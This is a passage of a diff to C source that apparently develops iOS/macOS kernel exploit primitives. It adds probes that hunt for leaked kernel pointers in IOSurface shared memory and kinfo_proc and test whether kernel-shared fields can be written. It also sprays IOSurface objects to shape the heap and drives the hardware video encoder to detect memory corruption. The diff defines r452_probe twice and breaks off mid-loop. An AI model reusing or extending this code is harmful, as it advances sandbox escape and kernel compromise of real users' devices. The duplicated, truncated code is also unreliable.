@@ -16978,6 +16978,262 @@ static void *r445_thread_fn(void *arg) {
 }
 
 
+static void r452_probe(void) {
+    rlog("\n=== r452: DarkSword pre-requisite tests ===\n\n");
+    fflush(stdout);
+
+    /* --- Vector A: ICMPv6 socket from sandbox --- */
+    rlog("  --- Vector A: ICMPv6 socket creation ---\n"); fflush(stdout);
+    {
+        int s6 = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        rlog("    socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = %d (errno=%d %s)\n",
+             s6, errno, s6 < 0 ? strerror(errno) : "OK");
+        if (s6 >= 0) {
+            /* Try setting icmp6_filter */
+            struct icmp6_filter filt;
+            ICMP6_FILTER_SETBLOCKALL(&filt);
+            int r = setsockopt(s6, IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+            rlog("    setsockopt(ICMP6_FILTER): %d (errno=%d)\n", r, r < 0 ? errno : 0);
+
+            /* Try getsockopt to read back */
+            struct icmp6_filter filt2;
+            socklen_t flen = sizeof(filt2);
+            r = getsockopt(s6, IPPROTO_ICMPV6, ICMP6_FILTER, &filt2, &flen);
+            rlog("    getsockopt(ICMP6_FILTER): %d len=%u (errno=%d)\n", r, (unsigned)flen, r < 0 ? errno : 0);
+
+            /* Try creating multiple sockets */
+            int count = 0, max_try = 500;
+            int fds[500];
+            for (int i = 0; i < max_try; i++) {
+                fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+                if (fds[i] < 0) break;
+                count++;
+            }
+            rlog("    Created %d/%d ICMPv6 sockets\n", count, max_try);
+            for (int i = 0; i < count; i++) close(fds[i]);
+            close(s6);
+        }
+    }
+
+    /* --- Vector B: pwritev/preadv with F_NOCACHE --- */
+    rlog("\n  --- Vector B: pwritev/preadv + F_NOCACHE ---\n"); fflush(stdout);
+    {
+        char tmppath[128];
+        snprintf(tmppath, sizeof(tmppath), "%s/r452_test", getenv("TMPDIR") ?: "/tmp");
+        int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+        rlog("    open(%s) = %d\n", tmppath, fd);
+        if (fd >= 0) {
+            int nc = fcntl(fd, F_NOCACHE, 1);
+            rlog("    fcntl(F_NOCACHE, 1) = %d (errno=%d)\n", nc, nc < 0 ? errno : 0);
+
+            /* Write 2 pages via pwritev */
+            char buf1[16384], buf2[16384];
+            memset(buf1, 'A', sizeof(buf1));
+            memset(buf2, 'B', sizeof(buf2));
+            struct iovec wv[2] = {{buf1, sizeof(buf1)}, {buf2, sizeof(buf2)}};
+            ssize_t nw = pwritev(fd, wv, 2, 0);
+            rlog("    pwritev(2 iovecs, 32768 bytes): %zd (errno=%d)\n", nw, nw < 0 ? errno : 0);
+
+            /* Read back via preadv */
+            char rb1[16384], rb2[16384];
+            struct iovec rv[2] = {{rb1, sizeof(rb1)}, {rb2, sizeof(rb2)}};
+            ssize_t nr = preadv(fd, rv, 2, 0);
+            rlog("    preadv(2 iovecs): %zd (errno=%d)\n", nr, nr < 0 ? errno : 0);
+            if (nr > 0) {
+                int match = (memcmp(rb1, buf1, sizeof(buf1)) == 0 &&
+                             memcmp(rb2, buf2, sizeof(buf2)) == 0);
+                rlog("    Data integrity: %s\n", match ? "MATCH" : "MISMATCH");
+            }
+            close(fd);
+            unlink(tmppath);
+        }
+    }
+
+    /* --- Vector C: mach_vm_map VM_FLAGS_OVERWRITE --- */
+    rlog("\n  --- Vector C: mach_vm_map VM_FLAGS_OVERWRITE ---\n"); fflush(stdout);
+    {
+        /* Allocate a region, then overwrite part of it */
+        mach_vm_address_t base = 0;
+        kern_return_t kr = mach_vm_allocate(mach_task_self(), &base, 0x10000, VM_FLAGS_ANYWHERE);
+        rlog("    mach_vm_allocate(64K): kr=0x%x addr=0x%llx\n", kr, (unsigned long long)base);
+        if (kr == KERN_SUCCESS) {
+            /* Write a pattern */
+            memset((void*)base, 'X', 0x10000);
+
+            /* Create a memory entry */
+            mach_vm_size_t esz = 0x4000;
+            mach_port_t entry = MACH_PORT_NULL;
+            memory_object_size_t memsz = esz;
+            kr = mach_make_memory_entry_64(mach_task_self(), &memsz, base, VM_PROT_READ|VM_PROT_WRITE, &entry, MACH_PORT_NULL);
+            rlog("    mach_make_memory_entry_64(16K): kr=0x%x entry=0x%x memsz=%llu\n", kr, entry, (unsigned long long)memsz);
+
+            if (kr == KERN_SUCCESS) {
+                /* Overwrite middle of region */
+                mach_vm_address_t target = base + 0x4000;
+                kr = mach_vm_map(mach_task_self(), &target, 0x4000, 0,
+                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                    entry, 0, FALSE, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE, VM_INHERIT_NONE);
+                rlog("    mach_vm_map(FIXED|OVERWRITE): kr=0x%x\n", kr);
+
+                if (kr == KERN_SUCCESS) {
+                    /* Check if the overwrite mapped the memory entry's content */
+                    char *p = (char *)(uintptr_t)(base + 0x4000);
+                    rlog("    After overwrite: first byte=0x%02x (expect 'X'=0x58)\n", (unsigned char)p[0]);
+                }
+                mach_port_deallocate(mach_task_self(), entry);
+            }
+            mach_vm_deallocate(mach_task_self(), base, 0x10000);
+        }
+    }
+
+    /* --- Vector D: PurpleGfxMem IOSurface + phys addr --- */
+    rlog("\n  --- Vector D: PurpleGfxMem IOSurface ---\n"); fflush(stdout);
+    {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 1, bpe = 1, pf = 0x4C303038; /* L008 grayscale */
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
+        int alloc_sz = 2 * 16384; /* 2 pages */
+        CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+
+        /* Request phys contiguous via PurpleGfxMem */
+        int phys = 1;
+        CFNumberRef physn = CFNumberCreate(NULL, kCFNumberIntType, &phys);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceNonPurgeable"), physn);
+
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn); CFRelease(an); CFRelease(physn);
+
+        if (surf) {
+            rlog("    PurpleGfxMem surf created: ID=%u alloc=%zu\n",
+                 IOSurfaceGetID(surf), IOSurfaceGetAllocSize(surf));
+
+            /* Lock and get base address */
+            IOSurfaceLock(surf, 0, NULL);
+            void *sbase = IOSurfaceGetBaseAddress(surf);
+            rlog("    Base address: %p\n", sbase);
+
+            /* Dump first 256 bytes of shared mapping for kernel ptrs */
+            if (sbase) {
+                uint64_t *words = (uint64_t *)sbase;
+                rlog("    Shared memory first 256 bytes:\n");
+                int kptr_count = 0;
+                for (int i = 0; i < 32; i++) {
+                    uint64_t w64 = words[i];
+                    int is_kptr = (w64 >> 36) == 0xFFFFFFF || (w64 >> 36) == 0xFFFFFFE;
+                    if (is_kptr) kptr_count++;
+                    rlog("      +%03d: 0x%016llx%s\n", i*8, (unsigned long long)w64,
+                         is_kptr ? " *** KPTR ***" : "");
+                }
+                rlog("    Kernel pointer candidates in first 256 bytes: %d\n", kptr_count);
+
+                /* Write pattern and read back */
+                uint64_t orig = words[0];
+                words[0] = 0xDEADBEEFCAFEBABEULL;
+                uint64_t readback = words[0];
+                words[0] = orig; /* restore */
+                rlog("    Write test: wrote 0xDEADBEEFCAFEBABE, read back 0x%016llx (%s)\n",
+                     (unsigned long long)readback,
+                     readback == 0xDEADBEEFCAFEBABEULL ? "WRITABLE" : "READ-ONLY or DIFFERENT");
+            }
+            IOSurfaceUnlock(surf, 0, NULL);
+
+            /* Check backing store offset in IOSurface struct (via GetBaseAddressOfPlane etc) */
+            size_t plane_bpr = IOSurfaceGetBytesPerRowOfPlane(surf, 0);
+            size_t plane_h = IOSurfaceGetHeightOfPlane(surf, 0);
+            rlog("    Plane 0: bpr=%zu height=%zu\n", plane_bpr, plane_h);
+
+            CFRelease(surf);
+        } else {
+            rlog("    PurpleGfxMem surface creation FAILED\n");
+        }
+    }
+
+    /* --- Vector E: IOSurface shared memory at known offsets --- */
+    rlog("\n  --- Vector E: IOSurface shared data structure scan ---\n"); fflush(stdout);
+    {
+        /* Create a regular IOSurface and examine its shared mapping */
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+        if (surf) {
+            uint32_t sid = IOSurfaceGetID(surf);
+            rlog("    Regular IOSurface ID=%u alloc=%zu\n", sid, IOSurfaceGetAllocSize(surf));
+
+            IOSurfaceLock(surf, 0, NULL);
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(surf);
+            if (base) {
+                rlog("    Pixel base: %p\n", base);
+                /* Scan backwards from pixel base for shared header struct
+                   IOSurface maps a shared header BEFORE the pixel data */
+                /* Try reading pages before the base address */
+                for (int pg = 1; pg <= 4; pg++) {
+                    uint8_t *probe = base - (pg * 16384);
+                    /* Carefully try to read — may segfault */
+                    rlog("    Probing base-%d pages (%p):\n", pg, probe);
+
+                    /* Use signal handler to safely probe */
+                    volatile int safe = 1;
+                    uint64_t *wp = (uint64_t *)probe;
+
+                    /* Just try first 8 words, catch SIGBUS/SIGSEGV */
+                    struct sigaction sa_old, sa_new;
+                    sigjmp_buf jmp_env;
+                    static volatile sigjmp_buf *active_jmp = NULL;
+
+                    /* Use mach_vm_read to safely probe */
+                    mach_vm_address_t paddr = (mach_vm_address_t)(uintptr_t)probe;
+                    vm_offset_t data_out = 0;
+                    mach_msg_type_number_t data_cnt = 0;
+                    kern_return_t kr = mach_vm_read(mach_task_self(), paddr, 256, &data_out, &data_cnt);
+                    if (kr == KERN_SUCCESS && data_cnt >= 256) {
+                        uint64_t *words = (uint64_t *)(uintptr_t)data_out;
+                        int found_kptr = 0;
+                        for (int i = 0; i < 32; i++) {
+                            uint64_t v = words[i];
+                            int is_kptr = (v >> 36) == 0xFFFFFFF || (v >> 36) == 0xFFFFFFE;
+                            if (is_kptr) found_kptr++;
+                            if (is_kptr || v == 0x4D55545A /* MUTZ */ || (v & 0xFFFFFFFF) == sid) {
+                                rlog("      +%03d: 0x%016llx%s%s%s\n", i*8, (unsigned long long)v,
+                                     is_kptr ? " KPTR" : "",
+                                     v == 0x4D55545A ? " MUTZ-MAGIC" : "",
+                                     (v & 0xFFFFFFFF) == sid ? " SURF-ID" : "");
+                            }
+                        }
+                        if (found_kptr) rlog("      Found %d kernel pointers!\n", found_kptr);
+                        mach_vm_deallocate(mach_task_self(), data_out, data_cnt);
+                    } else {
+                        rlog("      mach_vm_read failed: kr=0x%x (unmapped)\n", kr);
+                    }
+                }
+            }
+            IOSurfaceUnlock(surf, 0, NULL);
+            CFRelease(surf);
+        }
+    }
+
+    fflush(stdout);
+    rlog("\n=== r452 complete ===\n");
+}
 
 
 static void r450_probe(void) {
@@ -17314,15 +17570,586 @@ static void r450_probe(void) {
 }
 
 
-static void r451_probe(void) {
-    rlog("\n=== r451: AVE corruption CONTROL v2 (IOSurfaceSetValue) ===\n\n");
+static void r452_probe(void) {
+    rlog("\n=== r452: AVE zone-sweep — test multiple property sizes ===\n\n");
     fflush(stdout);
 
-    #define R451_SPRAY 30
-    #define R451_PROP_SZ 256
-    #define R451_MAGIC 0xCAFEBABE12345678ULL
+    #define R452_SPRAY 40
+    #define R452_MAGIC 0xBAADF00DCAFEULL
 
     int enc_w = 128, enc_h = 128;
+
+    /* Test multiple property sizes to find the zone AVE buffers land in */
+    int sizes[] = { 32, 64, 128, 256, 512, 1024, 2048, 4096 };
+    int nsizes = sizeof(sizes) / sizeof(sizes[0]);
+
+    /* Create encoder once, reuse across all size tests */
+    VTCompressionSessionRef enc = NULL;
+    CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+    CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+    OSStatus st = VTCompressionSessionCreate(NULL, enc_w, enc_h,
+        kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &enc);
+    CFRelease(es);
+    if (st != noErr || !enc) {
+        rlog("  FAIL: encoder err=%d\n", (int)st);
+        return;
+    }
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+    VTCompressionSessionPrepareToEncodeFrames(enc);
+
+    CVPixelBufferRef pb = create_pb(enc_w, enc_h);
+    if (!pb) {
+        rlog("  FAIL: no pixbuf\n");
+        VTCompressionSessionInvalidate(enc); CFRelease(enc);
+        return;
+    }
+
+    for (int si = 0; si < nsizes; si++) {
+        int prop_sz = sizes[si];
+        rlog("  --- Size %d bytes ---\n", prop_sz); fflush(stdout);
+
+        IOSurfaceRef surfs[R452_SPRAY];
+        memset(surfs, 0, sizeof(surfs));
+        int created = 0, missing = 0, bad = 0, scanned = 0;
+
+        /* Spray surfaces and set properties */
+        for (int i = 0; i < R452_SPRAY; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 16, h = 16, bpe = 4, pf = 0x42475241;
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pn);
+            surfs[i] = IOSurfaceCreate(p);
+            CFRelease(p); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
+            if (surfs[i]) {
+                created++;
+                uint8_t *sd = (uint8_t *)malloc(prop_sz);
+                for (int j = 0; j < prop_sz; j += 8) {
+                    uint64_t m = R452_MAGIC ^ ((uint64_t)i << 32) ^ ((uint64_t)si << 48) ^ (uint64_t)j;
+                    if (j + 8 <= prop_sz) memcpy(&sd[j], &m, 8);
+                }
+                CFDataRef d = CFDataCreate(NULL, sd, prop_sz);
+                char kn[32]; snprintf(kn, 32, "z%d_%03d", prop_sz, i);
+                CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
+                IOSurfaceSetValue(surfs[i], k, d);
+                CFRelease(d); CFRelease(k);
+                free(sd);
+            }
+        }
+
+        /* Free even-indexed to create holes */
+        for (int i = 0; i < R452_SPRAY; i += 2) {
+            if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+        }
+
+        /* Encode 300 frames */
+        g_cb_count = 0;
+        int enc_ok = 0;
+        for (int f = 0; f < 300; f++) {
+            CMTime t = CMTimeMake(si * 300 + f, 30);
+            OSStatus s = VTCompressionSessionEncodeFrame(enc, pb, t, kCMTimeInvalid, NULL, NULL, NULL);
+            if (s == noErr) enc_ok++;
+        }
+        VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+
+        /* Scan */
+        for (int i = 1; i < R452_SPRAY; i += 2) {
+            if (!surfs[i]) continue;
+            scanned++;
+            char kn[32]; snprintf(kn, 32, "z%d_%03d", prop_sz, i);
+            CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
+            CFTypeRef v = IOSurfaceCopyValue(surfs[i], k);
+            CFRelease(k);
+            if (!v) { missing++; continue; }
+            if (CFGetTypeID(v) == CFDataGetTypeID()) {
+                CFDataRef dv = (CFDataRef)v;
+                const uint8_t *b = CFDataGetBytePtr(dv);
+                CFIndex len = CFDataGetLength(dv);
+                int wc = 0;
+                for (int j = 0; j + 7 < len && j < prop_sz; j += 8) {
+                    uint64_t exp = R452_MAGIC ^ ((uint64_t)i << 32) ^ ((uint64_t)si << 48) ^ (uint64_t)j;
+                    uint64_t act; memcpy(&act, &b[j], 8);
+                    if (act != exp) {
+                        wc++;
+                        if (wc <= 2)
+                            rlog("    [%d]+%d: 0x%llx (exp 0x%llx)%s\n", i, j,
+                                 (unsigned long long)act, (unsigned long long)exp,
+                                 ((act >> 48) == 0xffff || (act >> 48) == 0xfffe) ? " ***KPTR***" : "");
+                    }
+                }
+                if (wc) bad++;
+            } else { bad++; }
+            CFRelease(v);
+        }
+        rlog("    enc=%d | missing=%d bad=%d / %d\n", enc_ok, missing, bad, scanned);
+        fflush(stdout);
+
+        for (int i = 0; i < R452_SPRAY; i++)
+            if (surfs[i]) CFRelease(surfs[i]);
+    }
+
+    /* Also test: use IOSurface BACKING STORE (pixel data) as the target */
+    rlog("\n  --- BACKING STORE test (pixel data corruption) ---\n"); fflush(stdout);
+    {
+        #define R452_BS_SPRAY 40
+        IOSurfaceRef surfs[R452_BS_SPRAY];
+        memset(surfs, 0, sizeof(surfs));
+        int created = 0, missing = 0, bad = 0, scanned = 0;
+
+        /* Create surfaces with sizes matching common AVE buffer zones */
+        /* 128x128 BGRA = 65536 bytes backing store */
+        for (int i = 0; i < R452_BS_SPRAY; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 128, h = 128, bpe = 4, pf = 0x42475241;
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pn);
+            surfs[i] = IOSurfaceCreate(p);
+            CFRelease(p); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
+            if (surfs[i]) {
+                created++;
+                IOSurfaceLock(surfs[i], 0, NULL);
+                uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(surfs[i]);
+                size_t alloc = IOSurfaceGetAllocSize(surfs[i]);
+                if (base && alloc > 0) {
+                    for (size_t j = 0; j < alloc && j < 65536; j += 8) {
+                        uint64_t m = R452_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
+                        memcpy(&base[j], &m, 8);
+                    }
+                }
+                IOSurfaceUnlock(surfs[i], 0, NULL);
+            }
+        }
+        rlog("    Created %d backing store surfaces (128x128 BGRA)\n", created);
+
+        /* Free even-indexed */
+        for (int i = 0; i < R452_BS_SPRAY; i += 2) {
+            if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+        }
+
+        /* Encode 300 frames */
+        g_cb_count = 0;
+        int enc_ok = 0;
+        for (int f = 0; f < 300; f++) {
+            CMTime t = CMTimeMake(nsizes * 300 + f, 30);
+            OSStatus s = VTCompressionSessionEncodeFrame(enc, pb, t, kCMTimeInvalid, NULL, NULL, NULL);
+            if (s == noErr) enc_ok++;
+        }
+        VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+
+        /* Scan backing stores */
+        for (int i = 1; i < R452_BS_SPRAY; i += 2) {
+            if (!surfs[i]) continue;
+            scanned++;
+            IOSurfaceLock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(surfs[i]);
+            size_t alloc = IOSurfaceGetAllocSize(surfs[i]);
+            int wc = 0;
+            if (base && alloc > 0) {
+                for (size_t j = 0; j < alloc && j < 65536; j += 8) {
+                    uint64_t exp = R452_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
+                    uint64_t act; memcpy(&act, &base[j], 8);
+                    if (act != exp) {
+                        wc++;
+                        if (wc <= 4)
+                            rlog("    [%d]+%zu: 0x%llx (exp 0x%llx)%s\n", i, j,
+                                 (unsigned long long)act, (unsigned long long)exp,
+                                 ((act >> 48) == 0xffff || (act >> 48) == 0xfffe) ? " ***KPTR***" : "");
+                    }
+                }
+            }
+            IOSurfaceUnlock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+            if (wc) { bad++; rlog("    [%d]: %d words CORRUPTED\n", i, wc); }
+        }
+        rlog("    Backing store: enc=%d | bad=%d / %d\n", enc_ok, bad, scanned);
+        fflush(stdout);
+
+        for (int i = 0; i < R452_BS_SPRAY; i++)
+            if (surfs[i]) CFRelease(surfs[i]);
+        #undef R452_BS_SPRAY
+    }
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(enc); CFRelease(enc);
+
+    rlog("\n=== r452 zone-sweep complete ===\n");
+
+    #undef R452_SPRAY
+    #undef R452_MAGIC
+}
+
+
+static void r451_probe(void) {
+    rlog("\n=== r451: IOSurface shared mem + kinfo_proc + ICMPv6 + kernel probing ===\n\n");
+    fflush(stdout);
+
+    /* ---- Vector A: IOSurface shared memory field analysis ---- */
+    rlog("  --- Vector A: IOSurface shared memory field analysis ---\n");
+    {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 32, h = 32, bpe = 4, pf = 0x42475241;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+
+        if (!surf) {
+            rlog("    FAILED to create surface\n");
+        } else {
+            uint32_t sid = IOSurfaceGetID(surf);
+            rlog("    Surface created, SID=%u\n", sid);
+
+            mach_vm_address_t addr = 0;
+            mach_vm_size_t rsize = 0;
+            mach_vm_address_t shared_addr = 0;
+            mach_vm_size_t shared_size = 0;
+            int found_shared = 0;
+
+            while (1) {
+                struct vm_region_submap_info_64 info;
+                mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                natural_t depth = 0;
+                kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &rsize, &depth,
+                    (vm_region_recurse_info_t)&info, &cnt);
+                if (kr != KERN_SUCCESS) break;
+                if (info.share_mode == 2 && info.user_tag == 7 && rsize >= 0x100000) {
+                    shared_addr = addr;
+                    shared_size = rsize;
+                    found_shared = 1;
+                    rlog("    Found shared region: addr=0x%llx size=0x%llx\n",
+                         (unsigned long long)shared_addr, (unsigned long long)shared_size);
+                    break;
+                }
+                addr += rsize;
+            }
+
+            if (found_shared) {
+                uint64_t *p = (uint64_t *)shared_addr;
+                rlog("    Shared region dump (first 256 bytes):\n");
+                for (int i = 0; i < 32; i++) {
+                    uint64_t v = p[i];
+                    const char *label = "";
+                    if (i == 0) label = " (refcount/flags)";
+                    else if (i == 1) label = " (use_count)";
+                    else if (i == 5) label = " (mutex area)";
+                    else if (i == 10) label = " (sentinel)";
+                    else if (i == 11) label = " (integrity_check)";
+                    else if (i == 14) label = " (backing_store_base)";
+                    else if (i == 15) label = " (connection_ptr)";
+                    else if (i == 16) label = " (surface_object_ptr)";
+                    else if (i == 17) label = " (surface_id / alloc_size)";
+                    else if (i == 18) label = " (alloc_size)";
+
+                    int is_kptr = ((v >> 48) == 0xffff || (v >> 48) == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL;
+                    rlog("      +%3d: 0x%016llx%s%s\n", i * 8, (unsigned long long)v,
+                         label, is_kptr ? " *** KPTR ***" : "");
+                }
+
+                uint32_t *w32 = (uint32_t *)shared_addr;
+                rlog("    MUTZ check at +40: 0x%08x %s\n", w32[10],
+                     (w32[10] == 0x4D55545A) ? "(MATCH)" : "(no match)");
+
+                uint64_t integrity_expected = ~(shared_addr + 0x28);
+                rlog("    Integrity check at +88: actual=0x%llx expected=0x%llx %s\n",
+                     (unsigned long long)p[11], (unsigned long long)integrity_expected,
+                     (p[11] == integrity_expected) ? "MATCH" : "MISMATCH");
+
+                rlog("    Testing shared memory writability...\n");
+                uint64_t orig_val = p[1];
+                rlog("    Original use_count (+8): 0x%llx\n", (unsigned long long)orig_val);
+
+                p[1] = 999;
+                uint64_t read_back = p[1];
+                rlog("    After write 999: read_back=0x%llx\n", (unsigned long long)read_back);
+                if (read_back == 999) {
+                    rlog("    *** SHARED MEMORY IS WRITABLE ***\n");
+                    p[1] = orig_val;
+                    rlog("    Restored use_count to 0x%llx\n", (unsigned long long)orig_val);
+                } else {
+                    rlog("    Shared memory is READ-ONLY (or write didn't stick)\n");
+                }
+
+                int kptr_count = 0;
+                for (int i = 0; i < 32; i++) {
+                    uint64_t v = p[i];
+                    if (((v >> 48) == 0xffff || (v >> 48) == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL) {
+                        kptr_count++;
+                    }
+                }
+                rlog("    Kernel pointer candidates in first 256 bytes: %d\n", kptr_count);
+            } else {
+                rlog("    Could not find SM_SHARED user_tag=7 region\n");
+            }
+            CFRelease(surf);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector B: kinfo_proc full analysis ---- */
+    rlog("\n  --- Vector B: kinfo_proc detailed analysis ---\n");
+    {
+        struct kinfo_proc kp;
+        size_t kp_size = sizeof(kp);
+        int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
+
+        if (sysctl(mib, 4, &kp, &kp_size, NULL, 0) == 0) {
+            rlog("    kinfo_proc size=%zu (struct=%zu)\n", kp_size, sizeof(kp));
+            uint8_t *raw = (uint8_t *)&kp;
+            rlog("    Last 88 bytes (offset 560-648):\n");
+            for (int off = 560; off + 7 < (int)kp_size; off += 8) {
+                uint64_t v;
+                memcpy(&v, raw + off, 8);
+                int is_kptr = ((v >> 48) == 0xffff || (v >> 48) == 0xfffe) && v != 0;
+                rlog("      byte %3d: 0x%016llx%s\n", off, (unsigned long long)v,
+                     is_kptr ? " *** KPTR ***" : "");
+            }
+
+            rlog("    e_paddr (kp+296): 0x%016llx\n", *(uint64_t *)(raw + 296));
+            rlog("    e_sess  (kp+304): 0x%016llx\n", *(uint64_t *)(raw + 304));
+
+            uint64_t val568_samples[5];
+            int stable = 1;
+            for (int i = 0; i < 5; i++) {
+                struct kinfo_proc kp2;
+                size_t sz2 = sizeof(kp2);
+                sysctl(mib, 4, &kp2, &sz2, NULL, 0);
+                memcpy(&val568_samples[i], (uint8_t *)&kp2 + 568, 8);
+            }
+            rlog("    Stability check at offset 568 (5 reads):\n");
+            for (int i = 0; i < 5; i++) {
+                rlog("      [%d] 0x%016llx\n", i, (unsigned long long)val568_samples[i]);
+                if (i > 0 && val568_samples[i] != val568_samples[0]) stable = 0;
+            }
+            rlog("    Offset 568 is %s\n", stable ? "STABLE" : "CHANGING");
+        }
+
+        for (int target_pid = 0; target_pid <= 1; target_pid++) {
+            struct kinfo_proc kp2;
+            size_t sz2 = sizeof(kp2);
+            int mib2[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, target_pid};
